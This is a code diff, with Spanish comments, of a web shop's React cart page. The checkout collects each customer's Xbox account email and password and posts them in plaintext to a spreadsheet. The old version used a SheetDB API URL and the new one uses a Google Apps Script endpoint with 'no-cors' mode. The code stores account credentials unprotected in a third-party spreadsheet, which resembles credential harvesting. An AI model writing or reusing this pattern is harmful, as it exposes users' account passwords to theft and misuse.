@@ -132,57 +132,24 @@ export default function CartPage() {
         finalReceiptUrl = uploadData.url;
       }
 
-      // --- 🚀 ENVIAR DATOS AL EXCEL VÍA SHEETDB (LLENANDO HUECOS) ---
+      // --- 🚀 ENVIAR DATOS A GOOGLE SHEETS (CELL-TARGETING) ---
       try {
-        const sheetDbUrl = 'https://sheetdb.io/api/v1/9mj5luy2lh9u4'; 
+        // PEGA AQUÍ TU NUEVA URL DE GOOGLE APPS SCRIPT
+        const googleScriptUrl = 'https://script.google.com/macros/s/AKfycbz...TU_URL_NUEVA.../exec'; 
         
-        // 1. Primero, obtenemos todos los correos actuales para saber cuántas filas están ocupadas en la columna A
-        const getRes = await fetch(`${sheetDbUrl}?limit=1000`);
-        const rows = await getRes.json();
-        
-        // Contamos cuántas celdas de "CORREO" ya tienen texto
-        let emptyRowIndex = 0;
-        for (let i = 0; i < rows.length; i++) {
-          if (!rows[i].CORREO || rows[i].CORREO.trim() === '') {
-            emptyRowIndex = i; // Encontramos la primera fila donde "CORREO" está vacío
-            break;
-          }
-          emptyRowIndex = i + 1;
-        }
+        // Empaquetamos los datos como un formulario nativo
+        const formData = new URLSearchParams();
+        formData.append('correo', xboxEmail.trim());
+        formData.append('contrasena', xboxPassword.trim());
 
-        // 2. Si hay una fila vacía en medio de tu tabla (ej: fila 2), la actualizamos
-        if (emptyRowIndex < rows.length) {
-          // SheetDB usa un identificador para actualizar. Como no tenemos un ID único, 
-          // usamos el número de fila que nos devuelve la API (o buscamos por alguna columna vacía).
-          // La forma más robusta con SheetDB para actualizar la fila específica N es usar el parámetro 'limit' y 'offset'.
-          // Sin embargo, para forzar actualización en la primera celda vacía de CORREO:
-          
-          await fetch(`${sheetDbUrl}/CORREO/`, {
-            method: 'PATCH',
-            headers: {
-              'Accept': 'application/json',
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-              data: {
-                "CORREO": xboxEmail.trim(),
-                "CONTRASENA": xboxPassword.trim()
-              }
-            })
-          });
-        } else {
-          // Si todas las filas de la tabla tienen correo, hacemos un POST normal al final
-          await fetch(sheetDbUrl, {
-            method: 'POST',
-            headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              data: {
-                "CORREO": xboxEmail.trim(),
-                "CONTRASENA": xboxPassword.trim()
-              }
-            })
-          });
-        }
+        await fetch(googleScriptUrl, {
+          method: 'POST',
+          mode: 'no-cors', // Evita bloqueos del navegador
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+          },
+          body: formData.toString()
+        });
       } catch (sheetError) {
         console.error("No se pudo guardar en el Excel:", sheetError);
       }
